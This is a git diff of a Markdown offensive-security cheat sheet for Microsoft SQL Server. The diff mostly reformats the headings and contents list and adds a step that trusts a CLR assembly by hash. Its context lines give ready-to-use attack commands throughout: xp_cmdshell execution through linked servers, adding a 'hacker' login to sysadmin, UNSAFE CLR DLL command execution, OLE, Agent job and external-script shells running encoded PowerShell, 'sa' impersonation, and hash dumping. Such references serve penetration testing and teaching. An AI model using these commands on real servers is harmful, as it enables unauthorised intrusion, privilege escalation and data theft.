@@ -2,68 +2,71 @@
 
 ## Summary
 
-* [Tools](#tools)
-* [Identify Instances and Databases](#identifiy-instaces-and-databases)
-	* [Discover Local SQL Server Instances](#discover-local-sql-server-instances)
-	* [Discover Domain SQL Server Instances](#discover-domain-sql-server-instances)
-    * [Discover Remote SQL Server Instances](#discover-remote-sql-instances)
-	* [Identify Encrypted databases](#identifiy-encrypted-databases) 
-	* [Version Query](#version-query)
-* [Identify Sensitive Information](#identify-sensitive-information)
-	* [Get Tables from a Specific Database](#get-tables-from-specific-databases)
-	* [Gather 5 Entries from Each Column](#gather-5-entries-from-each-column)
-	* [Gather 5 Entries from a Specific Table](#gather-5-entries-from-a-specific-table)
-    * [Dump common information from server to files](#dump-common-information-from-server-to-files)
-* [Linked Database](#linked-database)
-	* [Find Trusted Link](#find-trusted-link)
-	* [Execute Query Through The Link](#execute-query-through-the-link)
-	* [Crawl Links for Instances in the Domain](#crawl-links-for-instances-in-the-domain) 
-	* [Crawl Links for a Specific Instance](#crawl-links-for-a-specific-instance)
-	* [Query Version of Linked Database](#query-version-of-linked-database)
-	* [Execute Procedure on Linked Database](#execute-procedure-on-linked-database)
-	* [Determine Names of Linked Databases ](#determine-names-of-linked-databases)
-	* [Determine All the Tables Names from a Selected Linked Database](#determine-all-the-tables-names-from-a-selected-linked-database)
-	* [Gather the Top 5 Columns from a Selected Linked Table](#gather-the-top-5-columns-from-a-selected-linked-table)
-	* [Gather Entries from a Selected Linked Column](#gather-entries-from-a-selected-linked-column)
-* [Command Execution via xp_cmdshell](#command-execution-via-xp_cmdshell)
-* [Extended Stored Procedure](#extended-stored-procedure)
-	* [Add the extended stored procedure and list extended stored procedures](#add-the-extended-stored-procedure-and-list-extended-stored-procedures)
-* [CLR Assemblies](#clr-assemblies)
-	* [Execute commands using CLR assembly](#execute-commands-using-clr-assembly)
-	* [Manually creating a CLR DLL and importing it](#manually-creating-a-clr-dll-and-importing-it)
-* [OLE Automation](#ole-automation)
-	* [Execute commands using OLE automation procedures](#execute-commands-using-ole-automation-procedures)
-* [Agent Jobs](#agent-jobs)
-	* [Execute commands through SQL Agent Job service](#execute-commands-through-sql-agent-job-service)
-	* [List All Jobs](#list-all-jobs)
-* [External Scripts](#external-scripts)
-    * [Python](#python)
-    * [R](#r)
-* [Audit Checks](#audit-checks)
-	* [Find and exploit impersonation opportunities](#find-and-exploit-impersonation-opportunities) 
-* [Find databases that have been configured as trustworthy](#find-databases-that-have-been-configured-as-trustworthy)
-* [Manual SQL Server Queries](#manual-sql-server-queries)
-	* [Query Current User & determine if the user is a sysadmin](#query-current-user--determine-if-the-user-is-a-sysadmin)
-	* [Current Role](#current-role)
-	* [Current DB](#current-db)
-	* [List all tables](#list-all-tables)
-	* [List all databases](#list-all-databases)
-	* [All Logins on Server](#all-logins-on-server)
-	* [All Database Users for a Database](#all-database-users-for-a-database) 
-	* [List All Sysadmins](#list-all-sysadmins)
-	* [List All Database Roles](#list-all-database-role)
-	* [Effective Permissions from the Server](#effective-permissions-from-the-server)
-	* [Effective Permissions from the Database](#effective-permissions-from-the-database)
-	* [Find SQL Server Logins Which can be Impersonated for the Current Database](#find-sql-server-logins-which-can-be-impersonated-for-the-current-database)
-	* [Exploiting Impersonation](#exploiting-impersonation)
-	* [Exploiting Nested Impersonation](#exploiting-nested-impersonation)
-	* [MSSQL Accounts and Hashes](#mssql-accounts-and-hashes)
-* [References](#references)
+- [MSSQL Server](#mssql-server)
+	- [Summary](#summary)
+	- [Tools](#tools)
+	- [Identify Instances and Databases](#identify-instances-and-databases)
+		- [Discover Local SQL Server Instances](#discover-local-sql-server-instances)
+		- [Discover Domain SQL Server Instances](#discover-domain-sql-server-instances)
+		- [Discover Remote SQL Server Instances](#discover-remote-sql-server-instances)
+		- [Identify Encrypted databases](#identify-encrypted-databases)
+		- [Version Query](#version-query)
+	- [Identify Sensitive Information](#identify-sensitive-information)
+		- [Get Tables from a Specific Database](#get-tables-from-a-specific-database)
+		- [Gather 5 Entries from Each Column](#gather-5-entries-from-each-column)
+		- [Gather 5 Entries from a Specific Table](#gather-5-entries-from-a-specific-table)
+		- [Dump common information from server to files](#dump-common-information-from-server-to-files)
+	- [Linked Database](#linked-database)
+		- [Find Trusted Link](#find-trusted-link)
+		- [Execute Query Through The Link](#execute-query-through-the-link)
+		- [Crawl Links for Instances in the Domain](#crawl-links-for-instances-in-the-domain)
+		- [Crawl Links for a Specific Instance](#crawl-links-for-a-specific-instance)
+		- [Query Version of Linked Database](#query-version-of-linked-database)
+		- [Execute Procedure on Linked Database](#execute-procedure-on-linked-database)
+		- [Determine Names of Linked Databases](#determine-names-of-linked-databases)
+		- [Determine All the Tables Names from a Selected Linked Database](#determine-all-the-tables-names-from-a-selected-linked-database)
+		- [Gather the Top 5 Columns from a Selected Linked Table](#gather-the-top-5-columns-from-a-selected-linked-table)
+		- [Gather Entries from a Selected Linked Column](#gather-entries-from-a-selected-linked-column)
+	- [Command Execution via xp\_cmdshell](#command-execution-via-xp_cmdshell)
+	- [Extended Stored Procedure](#extended-stored-procedure)
+		- [Add the extended stored procedure and list extended stored procedures](#add-the-extended-stored-procedure-and-list-extended-stored-procedures)
+	- [CLR Assemblies](#clr-assemblies)
+		- [Execute commands using CLR assembly](#execute-commands-using-clr-assembly)
+		- [Manually creating a CLR DLL and importing it](#manually-creating-a-clr-dll-and-importing-it)
+	- [OLE Automation](#ole-automation)
+		- [Execute commands using OLE automation procedures](#execute-commands-using-ole-automation-procedures)
+	- [Agent Jobs](#agent-jobs)
+		- [Execute commands through SQL Agent Job service](#execute-commands-through-sql-agent-job-service)
+		- [List All Jobs](#list-all-jobs)
+	- [External Scripts](#external-scripts)
+		- [Python](#python)
+		- [R](#r)
+	- [Audit Checks](#audit-checks)
+		- [Find and exploit impersonation opportunities](#find-and-exploit-impersonation-opportunities)
+	- [Find databases that have been configured as trustworthy](#find-databases-that-have-been-configured-as-trustworthy)
+	- [Manual SQL Server Queries](#manual-sql-server-queries)
+		- [Query Current User \& determine if the user is a sysadmin](#query-current-user--determine-if-the-user-is-a-sysadmin)
+		- [Current Role](#current-role)
+		- [Current DB](#current-db)
+		- [List all tables](#list-all-tables)
+		- [List all databases](#list-all-databases)
+		- [All Logins on Server](#all-logins-on-server)
+		- [All Database Users for a Database](#all-database-users-for-a-database)
+		- [List All Sysadmins](#list-all-sysadmins)
+		- [List All Database Roles](#list-all-database-roles)
+		- [Effective Permissions from the Server](#effective-permissions-from-the-server)
+		- [Effective Permissions from the Database](#effective-permissions-from-the-database)
+		- [Find SQL Server Logins Which can be Impersonated for the Current Database](#find-sql-server-logins-which-can-be-impersonated-for-the-current-database)
+		- [Exploiting Impersonation](#exploiting-impersonation)
+		- [Exploiting Nested Impersonation](#exploiting-nested-impersonation)
+		- [MSSQL Accounts and Hashes](#mssql-accounts-and-hashes)
+	- [References](#references)
 
 ## Tools
 
 * [NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) - A PowerShell Toolkit for Attacking SQL Server
 * [skahwah/SQLRecon](https://github.com/skahwah/SQLRecon/) - A C# MS SQL toolkit designed for offensive reconnaissance and post-exploitation.
+
 
 ## Identify Instances and Databases
 
@@ -72,6 +75,7 @@
 ```ps1
 Get-SQLInstanceLocal
 ```
+
 
 ### Discover Domain SQL Server Instances
 
@@ -140,9 +144,11 @@ Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv
 
 ### Find Trusted Link
 
+
 ```sql
 select * from master..sysservers
 ```
+
 
 ### Execute Query Through The Link
 
@@ -164,6 +170,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 
 ### Crawl Links for Instances in the Domain 
+
 A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results
 
 
@@ -172,6 +179,7 @@ Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
 select * from master..sysservers
 ```
 
+
 ### Crawl Links for a Specific Instance
 
 ```ps1
@@ -179,12 +187,13 @@ Get-SQLServerLinkCrawl -Instance "<DBSERVERNAME\DBInstance>" -Verbose
 select * from openquery("<instance>",'select * from openquery("<instance2>",''select * from master..sysservers'')')
 ```
 
-### Query Version of Linked Database
 
+### Query Version of Linked Database
 
 ```ps1
 Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DBSERVERNAME\DBInstance>`",'select @@version')" -Verbose
 ```
+
 
 ### Execute Procedure on Linked Database
 
@@ -196,6 +205,7 @@ SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
 SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
 ```
 
+
 ### Determine Names of Linked Databases 
 
 > tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.
@@ -203,6 +213,7 @@ SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
 ```ps1
 Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from sys.databases')" -Verbose
 ```
+
 
 ### Determine All the Tables Names from a Selected Linked Database
 
@@ -212,6 +223,7 @@ Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openque
 ```ps1
 Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from <DatabaseNameFromPreviousCommand>.sys.tables')" -Verbose
 ```
+
 
 ### Gather the Top 5 Columns from a Selected Linked Table
 
@@ -287,14 +299,17 @@ Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
 	sp_dropextendedproc 'xp_calc'
 	```
 
+
 ## CLR Assemblies
 
 Prerequisites:
+
 * sysadmin privileges
 * CREATE ASSEMBLY permission (or)
 * ALTER ASSEMBLY permission (or)
 
 The execution takes place with privileges of the **service account**.
+
 
 ### Execute commands using CLR assembly
 
@@ -310,6 +325,7 @@ Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\
 # List all the stored procedures added using CLR
 Get-SQLStoredProcedureCLR -Instance <instance> -Verbose
 ```
+
 
 ### Manually creating a CLR DLL and importing it
 
@@ -372,18 +388,22 @@ Then follow these instructions:
 	RECONFIGURE
 	GO
 	```
-3. Import the assembly
+3. Trust the assembly by adding its SHA512 hash
+   ```sql
+	EXEC sys.sp_add_trusted_assembly 0x[SHA512], N'assembly';
+   ```
+4. Import the assembly
 	```sql
 	CREATE ASSEMBLY my_assembly
 	FROM 'c:\temp\cmd_exec.dll'
 	WITH PERMISSION_SET = UNSAFE;
 	```
-4. Link the assembly to a stored procedure
+5. Link the assembly to a stored procedure
 	```sql
 	CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
 	GO
 	```
-5. Execute and clean
+6. Execute and clean
 	```sql
 	cmd_exec "whoami"
 	DROP PROCEDURE cmd_exec
@@ -399,10 +419,12 @@ WITH PERMISSION_SET = UNSAFE
 GO 
 ```
 
+
 ## OLE Automation
 
 * :warning: Disabled by default
 * The execution takes place with privileges of the **service account**.
+
 
 ### Execute commands using OLE automation procedures
 
@@ -439,6 +461,8 @@ SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
 * The execution takes place with privileges of the **SQL Server Agent service account** if a proxy account is not configured.
 * :warning: Require **sysadmin** or **SQLAgentUserRole**, **SQLAgentReaderRole**, and **SQLAgentOperatorRole** roles to create a job.
 
+
+
 ### Execute commands through SQL Agent Job service
 
 ```ps1
@@ -461,6 +485,7 @@ EXEC dbo.sp_start_job N'test_powershell_job1';
 EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
 ```
 
+
 ### List All Jobs
 
 ```ps1
@@ -469,16 +494,21 @@ SELECT job.job_id, notify_level_email, name, enabled, description, step_name, co
 Get-SQLAgentJob -Instance "<DBSERVERNAME\DBInstance>" -username sa -Password Password1234 -Verbose
 ```
 
+
 ## External Scripts
 
-:warning: You need to enable **external scripts**.
+Requirements:
+
+* Feature 'Advanced Analytics Extensions' must be installed
+* Enable **external scripts**.
 
 ```sql
 sp_configure 'external scripts enabled', 1;
 RECONFIGURE;
 ```
 
-## Python:
+
+### Python
 
 ```ps1
 Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose
@@ -487,7 +517,8 @@ EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess
 WITH RESULT SETS (([cmd_out] nvarchar(max)))
 ```
 
-## R
+
+### R
 
 ```ps1
 Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose
@@ -498,6 +529,7 @@ GO
 
 @script=N'OutputDataSet <-data.frame(shell("dir",intern=T))'
 ```
+
 
 ## Audit Checks
 
@@ -519,6 +551,7 @@ Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instanc
 powerpick Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')" -Verbose -Debug
 ```
 
+
 ## Find databases that have been configured as trustworthy
 
 ```sql
@@ -535,6 +568,7 @@ Invoke-SQLUncPathInjection
 Invoke-SQLAuditPrivXpFileexist
 ```
 
+
 ## Manual SQL Server Queries
 
 ### Query Current User & determine if the user is a sysadmin
@@ -545,11 +579,13 @@ Select system_user
 select is_srvrolemember('sysadmin')
 ```
 
+
 ### Current Role
 
 ```sql
 Select user
 ```
+
 
 ### Current DB
 
@@ -557,11 +593,13 @@ Select user
 select db_name()
 ```
 
+
 ### List all tables
 
 ```sql
 select table_name from information_schema.tables
 ```
+
 
 ### List all databases
 
@@ -569,11 +607,13 @@ select table_name from information_schema.tables
 select name from master..sysdatabases
 ```
 
+
 ### All Logins on Server 
 
 ```sql
 Select * from sys.server_principals where type_desc != 'SERVER_ROLE'
 ```
+
 
 ### All Database Users for a Database 
 
@@ -581,11 +621,13 @@ Select * from sys.server_principals where type_desc != 'SERVER_ROLE'
 Select * from sys.database_principals where type_desc != 'database_role';
 ```
 
+
 ### List All Sysadmins
 
 ```sql
 SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1
 ```
+
 
 ### List All Database Roles
 
@@ -601,17 +643,20 @@ WHERE DB1.type = 'R'
 ORDER BY DB1.name;
 ```
 
+
 ### Effective Permissions from the Server
 
 ```sql
 select * from fn_my_permissions(null, 'server');
 ```
 
+
 ### Effective Permissions from the Database
 
 ```sql
 SELECT * FROM fn_dp1my_permissions(NULL, 'DATABASE');
 ```
+
 
 ### Find SQL Server Logins Which can be Impersonated for the Current Database
 
@@ -623,6 +668,7 @@ on a.grantor_principal_id = b.principal_id
 where a.permission_name = 'impersonate'
 ```
 
+
 ### Exploiting Impersonation
 
 ```sql
@@ -633,6 +679,7 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 SELECT ORIGINAL_LOGIN()
 ```
+
 
 ### Exploiting Nested Impersonation
 
@@ -646,6 +693,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 SELECT ORIGINAL_LOGIN()
 SELECT SYSTEM_USER
 ```
+
 
 ### MSSQL Accounts and Hashes
 
